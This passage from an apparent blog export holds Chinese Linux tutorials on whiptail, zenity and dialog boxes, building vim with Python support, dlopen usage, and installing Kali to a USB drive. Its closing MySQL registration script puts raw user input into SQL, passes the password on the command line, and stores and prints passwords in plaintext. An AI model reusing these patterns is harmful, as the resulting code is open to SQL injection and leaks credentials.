<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Box options: </span><br><span class="line">	--msgbox &lt;text&gt; &lt;height&gt; &lt;width&gt;</span><br><span class="line">	--yesno  &lt;text&gt; &lt;height&gt; &lt;width&gt;</span><br><span class="line">	--infobox &lt;text&gt; &lt;height&gt; &lt;width&gt;</span><br><span class="line">	--inputbox &lt;text&gt; &lt;height&gt; &lt;width&gt; [init] </span><br><span class="line">	--passwordbox &lt;text&gt; &lt;height&gt; &lt;width&gt; [init] </span><br><span class="line">	--textbox &lt;file&gt; &lt;height&gt; &lt;width&gt;</span><br><span class="line">	--menu &lt;text&gt; &lt;height&gt; &lt;width&gt; &lt;listheight&gt; [tag item] ...</span><br><span class="line">	--checklist &lt;text&gt; &lt;height&gt; &lt;width&gt; &lt;listheight&gt; [tag item status]...</span><br><span class="line">	--radiolist &lt;text&gt; &lt;height&gt; &lt;width&gt; &lt;listheight&gt; [tag item status]...</span><br><span class="line">	--gauge &lt;text&gt; &lt;height&gt; &lt;width&gt; &lt;percent&gt;</span><br><span class="line">Options: (depend on box-option)</span><br><span class="line">	--clear				clear screen on exit</span><br><span class="line">	--defaultno			default no button</span><br><span class="line">	--default-item &lt;string&gt;		set default string</span><br><span class="line">	--fb, --fullbuttons		use full buttons</span><br><span class="line">	--nocancel			no cancel button</span><br><span class="line">	--yes-button &lt;text&gt;		set text of yes button</span><br><span class="line">	--no-button &lt;text&gt;		set text of no button</span><br><span class="line">	--ok-button &lt;text&gt;		set text of ok button</span><br><span class="line">	--cancel-button &lt;text&gt;		set text of cancel button</span><br><span class="line">	--noitem			don&apos;t display items</span><br><span class="line">	--notags			don&apos;t display tags</span><br><span class="line">	--separate-output		output one line at a time</span><br><span class="line">	--output-fd &lt;fd&gt;		output to fd, not stdout</span><br><span class="line">	--title &lt;title&gt;			display title</span><br><span class="line">	--backtitle &lt;backtitle&gt;		display backtitle</span><br><span class="line">	--scrolltext			force vertical scrollbars</span><br><span class="line">	--topleft			put window in top-left corner</span><br><span class="line">	-h, --help			print this message</span><br><span class="line">	-v, --version			print version information</span><br></pre></td></tr></table></figure>

<h4 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h4><blockquote>
<p>$ whiptail –title ‘Message’ –msgbox ‘Hi man~’ 10 20 –ok-button ‘OK’<br>$ whiptail –title ‘Login’ –output-fd 1 –inputbox ‘Please enter username: ‘ 10 20 ‘root’</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">echo "" &gt; .tmp_username</span><br><span class="line">echo "" &gt; .tmp_passphras</span><br><span class="line">username=$(whiptail --title 'Login' --inputbox 'Please enter username: ' 10 20 'root' 1&gt;&amp;2 2&gt;.tmp_username)</span><br><span class="line">if [ "$?" -eq 0 ];then</span><br><span class="line">    username=$(cat .tmp_username)</span><br><span class="line">    if [[ -n $username  ]];then</span><br><span class="line">        echo "==&gt;"$username</span><br><span class="line">    else</span><br><span class="line">        echo 'Null Username!'</span><br><span class="line">    fi</span><br><span class="line">else</span><br><span class="line">    echo "ERROR=&gt; "$?</span><br><span class="line">    exit</span><br><span class="line">fi</span><br><span class="line">passphras=$(whiptail --title 'Login' --passwordbox 'Please enter password: ' 10 20 1&gt;&amp;2 2&gt;.tmp_passphras)</span><br><span class="line">if [ "$?" -eq 0 ];then</span><br><span class="line">    passphras=$(cat .tmp_passphras)</span><br><span class="line">    if [[ -n $passphras  ]];then</span><br><span class="line">        echo "==&gt;"$passphras</span><br><span class="line">    else</span><br><span class="line">        echo 'Null Passphras!'</span><br><span class="line">    fi</span><br><span class="line">else</span><br><span class="line">    echo "ERROR=&gt; "$?</span><br><span class="line">    exit</span><br><span class="line">fi</span><br><span class="line">rm .tmp_username</span><br><span class="line">rm .tmp_passphras</span><br></pre></td></tr></table></figure>

<h3 id="3-Zenity"><a href="#3-Zenity" class="headerlink" title="3.Zenity"></a>3.Zenity</h3><p>适用于 GNOME环境 的图形化界面包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zenity --help</span><br><span class="line">用法：</span><br><span class="line">  zenity [OPTION…]</span><br><span class="line">帮助选项：</span><br><span class="line">  -h, --help                               显示帮助选项</span><br><span class="line">  --help-all                               显示全部帮助选项</span><br><span class="line">  --help-general                           显示常规选项</span><br><span class="line">  --help-calendar                          显示日历选项</span><br><span class="line">  --help-entry                             显示文字输入选项</span><br><span class="line">  --help-error                             显示错误选项</span><br><span class="line">  --help-info                              显示信息选项</span><br><span class="line">  --help-file-selection                    显示文件选择选项</span><br><span class="line">  --help-list                              显示列表选项</span><br><span class="line">  --help-notification                      显示通知图标选项</span><br><span class="line">  --help-progress                          显示进度选项</span><br><span class="line">  --help-question                          显示问题选项</span><br><span class="line">  --help-warning                           显示警告选项</span><br><span class="line">  --help-scale                             显示范围选项</span><br><span class="line">  --help-text-info                         显示文本信息选项</span><br><span class="line">  --help-color-selection                   显示颜色选择选项</span><br><span class="line">  --help-password                          显示口令对话框选项</span><br><span class="line">  --help-forms                             显示表单对话框选项</span><br><span class="line">  --help-misc                              显示杂类选项</span><br><span class="line">  --help-gtk                               显示 GTK+ 选项</span><br><span class="line">应用程序选项：</span><br><span class="line">  --calendar                               显示日历对话框</span><br><span class="line">  --entry                                  显示文本输入对话框</span><br><span class="line">  --error                                  显示错误对话框</span><br><span class="line">  --info                                   显示信息对话框</span><br><span class="line">  --file-selection                         显示文件选择对话框</span><br><span class="line">  --list                                   显示列表对话框</span><br><span class="line">  --notification                           显示通知</span><br><span class="line">  --progress                               显示进度指示对话框</span><br><span class="line">  --question                               显示问题对话框</span><br><span class="line">  --warning                                显示警告对话框</span><br><span class="line">  --scale                                  显示范围对话框</span><br><span class="line">  --text-info                              显示文本信息对话框</span><br><span class="line">  --color-selection                        显示颜色选择对话框</span><br><span class="line">  --password                               显示口令对话框</span><br><span class="line">  --forms                                  显示表单对话框</span><br><span class="line">  --display=DISPLAY                        X display to use</span><br></pre></td></tr></table></figure>

<blockquote>
<p>$ zenity –help-info<br>用法：<br>zenity [OPTION…]</p>
<p>信息选项<br>–info 显示信息对话框<br>–text=文字 设置对话框文字<br>–icon-name=图标名 设置对话框图标<br>–no-wrap 不启用文本自动换行<br>–no-markup 不启用 pango 标记<br>–ellipsize 在对话框文本中启用简略显示。这可以修复带有长文本的窗口的尺寸过大。</p>
</blockquote>
<p>更多信息 man</p>
<blockquote>
<p>$ zenity –info –text=’Hello World’ –title=’Messge’ –width=30 –height=30 –timeout=3<br>$ find . -name ‘<em>’ | zenity –progress –pulsate<br>$ find . -name ‘</em>’ | zenity –list –title “Search Results” –text “Finding all header files..” –column “Files”</p>
</blockquote>
<h3 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h3><p>现在，给出一个例子来实现MySQL数据库插入数据，用到了 <strong>dialog</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">exit_code=0</span><br><span class="line">is_reg_ok=0</span><br><span class="line">trap "echo;echo Have fun!;" EXIT</span><br><span class="line"><span class="meta">#</span><span class="bash"> get datetime</span></span><br><span class="line">get_datenow()&#123;</span><br><span class="line">    local now=$(date +'%Y-%m-%d %H:%M:%S')</span><br><span class="line">    echo $now</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"> start MYSQL server</span></span><br><span class="line">start_MYSQL_server()&#123;</span><br><span class="line">    echo 'Starting MYSQL Server...'</span><br><span class="line">    service mysql start</span><br><span class="line">    echo 'MHSQL Started!'</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"> showed user information when registered successfully</span></span><br><span class="line">show_user_info()&#123;</span><br><span class="line">    if [[ $is_reg_ok -eq 1 ]];then</span><br><span class="line">        echo</span><br><span class="line">        #shift</span><br><span class="line">        echo -e "UserName: [ \033[1;33m$1\033[0m ]"</span><br><span class="line">        echo -e "PassWord: [ \033[1;33m$2\033[0m ]"</span><br><span class="line">        echo -e "ID Name: [ \033[1;33m$3\033[0m ]"</span><br><span class="line">        echo -e "Register Date: [ \033[1;33m$4\033[0m ]"</span><br><span class="line">        echo</span><br><span class="line">    fi</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">###########################################</span></span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#</span><span class="bash">       this is a bash script that </span></span><br><span class="line"><span class="meta">#</span><span class="bash">       quickly inset user data to mysql server database</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">###########################################</span></span></span><br><span class="line">echo</span><br><span class="line">echo -e "Welcome to here ,you can register the account quickly...so let 's go!'"</span><br><span class="line">echo</span><br><span class="line">read -p 'Your username: ' -t 8 -r reg_user</span><br><span class="line">if [ -z $reg_user ];then echo;echo 'Empty!'; exit;fi</span><br><span class="line">read -p 'Your password: ' -t 8 -r reg_pass</span><br><span class="line">if [ -z $reg_pass ];then echo;echo 'Empty!'; exit;fi</span><br><span class="line">read -p 'Your password[confirm]: ' -s -t 8 -r reg_pass_confirm</span><br><span class="line">if [ -z $reg_pass_confirm ];then echo;echo 'Password not same!'; exit;fi</span><br><span class="line">echo</span><br><span class="line">read -p 'Your ID name: ' -t 8 -r reg_idname</span><br><span class="line">if [ -z $reg_idname ];then echo;echo 'Empty!'; exit;fi</span><br><span class="line">start_MYSQL_server</span><br><span class="line"><span class="meta">#</span><span class="bash"> here append a --stdout instead of default --stderr,so we can get the result....</span></span><br><span class="line">username=$(dialog --max-input 8 --timeout 8 --inputbox 'Please enter MYSQL username: ' 10 10 'root' --stdout)</span><br><span class="line">exit_code=$?</span><br><span class="line">password=$(dialog --max-input 15 --timeout 8 --passwordbox 'Please enter MYSQL password: ' 10 10 --stdout)</span><br><span class="line">clear</span><br><span class="line"><span class="meta">#</span><span class="bash"> check the username is empty</span></span><br><span class="line">if [ "$exit_code" -eq 0 ];then</span><br><span class="line">    if [ -z "$username" ] ;then</span><br><span class="line">        echo -e "\033[1;31mNot Empty Username!\033[0m"</span><br><span class="line">        exit</span><br><span class="line">    fi</span><br><span class="line">else</span><br><span class="line">    exit</span><br><span class="line">fi</span><br><span class="line">mysql_string="mysql -u$&#123;username&#125; -p$&#123;password&#125;" </span><br><span class="line">now_string=$(get_datenow)</span><br><span class="line"><span class="meta">#</span><span class="bash"> register ==&gt; insert data to mysql</span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;mysql_string&#125; --execute=<span class="string">"INSERT INTO db_info.tb_users (username,password,idname,reg_datetime) values ('<span class="variable">$&#123;reg_user&#125;</span>','<span class="variable">$&#123;reg_pass_confirm&#125;</span>','<span class="variable">$&#123;reg_idname&#125;</span>','<span class="variable">$&#123;now_string&#125;</span>');"</span></span></span><br><span class="line">if [ "$?" -eq 0 ];then</span><br><span class="line">    echo -e "\033[1;32mRegister successfully!\033[0m"</span><br><span class="line">    let is_reg_ok=1 </span><br><span class="line">    show_user_info $reg_user $reg_pass_confirm $reg_idname $now_string</span><br><span class="line">    exit 0</span><br><span class="line">else</span><br><span class="line">    echo -e "\033[1;31mRegister failed!\033[0m"</span><br><span class="line">    exit 1</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Vim支持Python2/Python3</title>
    <url>/vim-support-python/</url>
    <content><![CDATA[<p>Archlinux安装vim是默认应该是支持Python2和Python3的，而Ubuntu等若直接安装vim则只支持Python3。那么这样的话vim就无法使用YCM插件了，因此本文介绍从源代码安装vim支持以Python2和Python3。</p>
<a id="more"></a>

<h3 id="查看vim是否支持Python"><a href="#查看vim是否支持Python" class="headerlink" title="查看vim是否支持Python"></a>查看vim是否支持Python</h3><p>用如下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim --version</span><br></pre></td></tr></table></figure>

<p>若显示一下，则表示默认不支持。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-python/dyn</span><br><span class="line">+python3/dyn</span><br></pre></td></tr></table></figure>

<h3 id="编译vim源代码，安装vim"><a href="#编译vim源代码，安装vim" class="headerlink" title="编译vim源代码，安装vim"></a>编译vim源代码，安装vim</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/vim/vim.git</span><br><span class="line"><span class="built_in">cd</span> vim</span><br><span class="line">sudo apt-get install libncurses5-dev python-dev python3-dev</span><br><span class="line"></span><br><span class="line">./configure --with-features=huge \</span><br><span class="line">-<span class="built_in">enable</span>-rubyinterp \</span><br><span class="line">-<span class="built_in">enable</span>-pythoninterp \</span><br><span class="line">-<span class="built_in">enable</span>-python3interp \</span><br><span class="line">--<span class="built_in">enable</span>-luainterp \</span><br><span class="line">--<span class="built_in">enable</span>-perlinterp \</span><br><span class="line">--<span class="built_in">enable</span>-multibyte \</span><br><span class="line">--<span class="built_in">enable</span>-cscope \</span><br><span class="line">--with-python-config-dir=/usr/lib/python2.7/config-x86_64-linux-gnu/ \</span><br><span class="line">--with-python3-config-dir=/usr/lib/python3.7/config-3.7m-x86_64-linux-gnu/</span><br><span class="line"></span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>

<p>其中 <code>--with-python-config-dir</code> 和 <code>--with-python3-config-dir</code> 视自己Python目录而定。</p>
<p>再次查看vim版本就发现支持Python了！</p>
]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Vim</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux dlopen 加载动态链接库</title>
    <url>/linux-dlopen/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>说到加载库,第一个方法就是包含库的头文件,在编译时通过  加载链接库.第二种方法在运行时用函数来加载链接库,获取其中的函数地址并调用.本文讲述后者</p>
<a id="more"></a>



<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>接触过WindowsAPI的应该知道,静态库后缀为,动态链接库后缀,而主要用到函数</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">HMODULE WINAPI <span class="title">LoadLibrary</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_ LPCTSTR lpFileName</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>获取函数地址则是</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">FARPROC WINAPI <span class="title">GetProcAddress</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_ HMODULE hModule,</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_ LPCSTR  lpProcName</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>MSDN上的例子</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//声明函数指针</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(WINAPI *PGNSI)</span><span class="params">(LPSYSTEM_INFO)</span></span>;</span><br><span class="line"><span class="comment">// Call GetNativeSystemInfo if supported or GetSystemInfo otherwise.</span></span><br><span class="line">   PGNSI pGNSI;</span><br><span class="line">   SYSTEM_INFO si;</span><br><span class="line">   ZeroMemory(&amp;si, <span class="keyword">sizeof</span>(SYSTEM_INFO));</span><br><span class="line">   </span><br><span class="line">   pGNSI = (PGNSI) GetProcAddress(</span><br><span class="line">      GetModuleHandle(TEXT(<span class="string">"kernel32.dll"</span>)), </span><br><span class="line">      <span class="string">"GetNativeSystemInfo"</span>);</span><br><span class="line">   <span class="keyword">if</span>(<span class="literal">NULL</span> != pGNSI)</span><br><span class="line">   &#123;</span><br><span class="line">      pGNSI(&amp;si);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span> </span><br><span class="line">   &#123;</span><br><span class="line">       GetSystemInfo(&amp;si);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>由此可看,Windows也实现了对库文件的调用,那么Linux下怎么调用呢?<br>关于Linux调用库的头文件可以参考 <a href="https://linux.die.net/man/3/dlopen" target="_blank" rel="noopener">https://linux.die.net/man/3/dlopen</a></p>
<p>必须包含的头文件 <code>dlfcn.h</code><br>常用函数:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//加载链接库</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">dlopen</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">int</span> flag)</span></span>;</span><br><span class="line"><span class="comment">//返回获取的错误</span></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">dlerror</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="comment">//获取链接库函数地址</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">dlsym</span><span class="params">(<span class="keyword">void</span> *handle, <span class="keyword">const</span> <span class="keyword">char</span> *symbol)</span></span>;</span><br><span class="line"><span class="comment">//卸载链接库</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dlclose</span><span class="params">(<span class="keyword">void</span> *handle)</span></span>;</span><br></pre></td></tr></table></figure>

<p>注意,在编译时,要指明 <strong>-ldl</strong></p>
<p>除此之外,还有连个也比较有用的函数<strong>dladdr() dlvsym()</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//获取函数的信息</span></span><br><span class="line"><span class="comment">//dladdr() returns 0 on error, and nonzero on success</span></span><br><span class="line"><span class="comment">//If no symbol matching addr could be found, then dli_sname and dli_saddr are set to NULL</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dladdr</span><span class="params">(<span class="keyword">void</span> *addr, Dl_info *info)</span></span>;</span><br><span class="line">The function dladdr() takes a function pointer and tries to resolve name and file where it is located. Information is stored in the Dl_info structure:</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *dli_fname;  <span class="comment">/* Pathname of shared object that</span></span><br><span class="line"><span class="comment">                               contains address */</span></span><br><span class="line">    <span class="keyword">void</span>       *dli_fbase;  <span class="comment">/* Address at which shared object</span></span><br><span class="line"><span class="comment">                               is loaded */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *dli_sname;  <span class="comment">/* Name of nearest symbol with address</span></span><br><span class="line"><span class="comment">                               lower than addr */</span></span><br><span class="line">    <span class="keyword">void</span>       *dli_saddr;  <span class="comment">/* Exact address of symbol named</span></span><br><span class="line"><span class="comment">                               in dli_sname */</span></span><br><span class="line">&#125; Dl_info;</span><br><span class="line"><span class="comment">//类似dlsym()</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">dlvsym</span><span class="params">(<span class="keyword">void</span> *handle, <span class="keyword">char</span> *symbol, <span class="keyword">char</span> *version)</span></span>;</span><br></pre></td></tr></table></figure>

<p>下面以一个简单的例子说明</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt; //包含的头文件</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LIB_PATH <span class="meta-string">"./libtest.so"</span></span></span><br><span class="line"><span class="comment">//声明函数指针</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*PFUN)</span><span class="params">(<span class="keyword">int</span> ,<span class="keyword">int</span> )</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PFUN pf=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">//加载链接库</span></span><br><span class="line">    <span class="keyword">void</span> *handle=dlopen(LIB_PATH,RTLD_LAZY);</span><br><span class="line">    <span class="keyword">if</span>(handle==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"load library failed!\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//dlvsym(handle,"add","1.0.0"); </span></span><br><span class="line">    <span class="comment">//获取链接库里函数地址</span></span><br><span class="line">    <span class="comment">//方法1,参考网站上的写法</span></span><br><span class="line">    <span class="comment">//*(void**)(&amp;pf)=dlsym(handle,"add");</span></span><br><span class="line">   </span><br><span class="line">    <span class="comment">//方法2,相当与Windows下的 GetProcAddress() 函数.</span></span><br><span class="line">    pf=(PFUN)dlsym(handle,<span class="string">"sub"</span>);</span><br><span class="line">    <span class="keyword">if</span>(pf!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="comment">//获取函数地址信息</span></span><br><span class="line">        Dl_info info;</span><br><span class="line">       <span class="keyword">int</span> r= dladdr((<span class="keyword">void</span>*)pf,&amp;info);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"library filepath:%s\n"</span>\</span><br><span class="line">                <span class="string">"address1:0x%08x\n"</span>\</span><br><span class="line">                <span class="string">"funciton name:%s\n"</span>\</span><br><span class="line">                <span class="string">"address2:0x%08x\n\n"</span>,</span><br><span class="line">                info.dli_fname,info.dli_fbase,</span><br><span class="line">                info.dli_sname,info.dli_saddr);</span><br><span class="line">        <span class="comment">//0 表示失败</span></span><br><span class="line">        <span class="keyword">if</span>(r==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"can not get the dl info...\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"get the function address...\n"</span>);</span><br><span class="line">        <span class="comment">//调用函数</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"result: %d \n"</span>,pf(<span class="number">50</span>,<span class="number">15</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"can not get the function address...\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//卸载链接库</span></span><br><span class="line">    dlclose(handle);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>生成:<code>g++ test.cpp -o out_test -ldl -rdynamic</code><br>运行<code>./out_test</code><br>输出结果如下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">library filepath:./libtest.so</span><br><span class="line">address1:<span class="number">0xeabfa000</span></span><br><span class="line">funciton name:sub</span><br><span class="line">address2:<span class="number">0xeabfa7f4</span></span><br><span class="line"><span class="built_in">get</span> the function address...</span><br><span class="line">result: <span class="number">35</span></span><br></pre></td></tr></table></figure>

<p>注意上面的库文件<strong>libtest.so</strong>在当前程序目录下的,代码如下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _TEST_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _TEST_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> <span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> <span class="function"><span class="keyword">int</span> <span class="title">sub</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a-b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> <span class="function"><span class="keyword">int</span> <span class="title">maxnum</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a&gt;b?a:b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>然后 <code>g++ -fPIC -shared test.cpp -o libtest.so</code>即可生成动态链接库</p>
]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>Linux</tag>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>安装Linux系统到U盘</title>
    <url>/installed-system-to-usb/</url>
    <content><![CDATA[<p>有时我们想让一个系统随时随地切换到另一台机器上，实现便携式系统。即通过一个U盘启动切换要启动的系统。本文以一个Linux系统安装到U盘为例简单介绍。</p>
<a id="more"></a>

<h3 id="准备条件"><a href="#准备条件" class="headerlink" title="准备条件"></a>准备条件</h3><blockquote>
<p>Linux ISO镜像文件： <a href="https://www.kali.org/downloads/" target="_blank" rel="noopener">Kali Linux Light 64 Bit (2018.2)</a> <strong>865M</strong><br>VirtualBox虚拟机： <a href="https://www.virtualbox.org/wiki/Downloads" target="_blank" rel="noopener">https://www.virtualbox.org/wiki/Downloads</a><br>U盘： Kingston Datatraveler USB(2.0) / <strong>SanDisk Ultra USB 3.0</strong> 推荐30GB以上</p>
<p>注意： 如果U盘是3.0的，VirtualBox需要额外安装拓展包。方法见下文</p>
</blockquote>
<p>注意： 如果U盘是3.0的，VirtualBox需要额外安装拓展包。方法见下文</p>
<h3 id="支持USB3-0"><a href="#支持USB3-0" class="headerlink" title="支持USB3.0"></a>支持USB3.0</h3><p>默认virtual box只支持USB1.0/2.0，要想让他支持USB3.0，需要到 <a href="https://www.virtualbox.org/wiki/Downloads" target="_blank" rel="noopener">官网</a> 下载拓展包（Extension Pack）<br><img src="/uploads/images/virtual_box/file_001.png" alt="img"></p>
<p>注意，要下载对应VirtualBox版本的 <strong>Extension Pack</strong>，当前我使用的版本是5.2.8。另外我的U盘是USB2.0的</p>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>在启动虚拟机前，需要插入U盘。<br>用 <strong>lsblk</strong> 可看到该设备为sdb</p>
<blockquote>
<p>sdb 8:16 1 7.2G 0 disk<br>└─sdb1 8:17 1 7.2G 0 part /media/root/3c6de664-902f-4f45-b588-f295e7c42666</p>
</blockquote>
<p>要让VirtualBox能够访问到USB设备，还需要执行以下命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vboxmanage internalcommands createrawvmdk -filename usb.vmdk -rawdisk /dev/sdb</span><br></pre></td></tr></table></figure>

<p>其中 <strong>/dev/sdb</strong> 对于USB的设备文件名称<br>这会在当前目录创建一个 <strong>usb.vmdk</strong> 文件</p>
<p>接着启动虚拟机，任意新建一个虚拟电脑，默认下一步，直至创建成功<br><img src="/uploads/images/virtual_box/file_003.png" alt="img"></p>
<p>【设置】-&gt;【存储】底盘为Linux ISO文件，同时添加一个虚拟盘（<strong>使用现有的虚拟盘</strong>），并选择刚才创建好的<strong>usb.vmdk</strong>文件</p>
<p>启动该虚拟机<br><img src="/uploads/images/virtual_box/file_004.png" alt="img"><br><img src="/uploads/images/virtual_box/file_005.png" alt="img"><br><img src="/uploads/images/virtual_box/file_006.png" alt="img"></p>
<p>到了磁盘分区要注意，我们要选择 <strong>sdb</strong>，即要将Linux系统安装到的U盘设备</p>
<p><img src="/uploads/images/virtual_box/file_007.png" alt="img"><br><img src="/uploads/images/virtual_box/file_008.png" alt="img"></p>
<p>之后就是漫长等待…<br><img src="/uploads/images/virtual_box/file_009.png" alt="img"></p>
<p>安装完成之后，重启虚拟机，同时按 <strong>F11</strong> ，即可进入系统启动项选择。<br><img src="/uploads/images/virtual_box/file_010.png" alt="img"></p>
<h3 id="解决中文乱码"><a href="#解决中文乱码" class="headerlink" title="解决中文乱码"></a>解决中文乱码</h3><p>登录之后发现系统显示中文乱码！</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo $LANG</span><br><span class="line">输出 zh_CN.UTF-8</span><br></pre></td></tr></table></figure>

<p>先修改更新源，编辑 <strong>/etc/apt/sources.list</strong> 文件，添加以下内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">deb https://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src https://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure>

<p>在终端下输入 <code>apt-get upgrade</code> 更新系统</p>
<p>输入 <strong>dpkg-reconfigure locales</strong> 之后选中<strong>en_US.UTF-8</strong>和<strong>zh_CN.UTF-8</strong>，确定后，将<strong>zh_CN.UTF-8</strong>选为默认</p>
<p>安装中文字体</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install xfonts-wqy xfonts-intl-chinese</span><br></pre></td></tr></table></figure>

<p>重启</p>
<p><img src="/uploads/images/virtual_box/file_011.png" alt="img"></p>
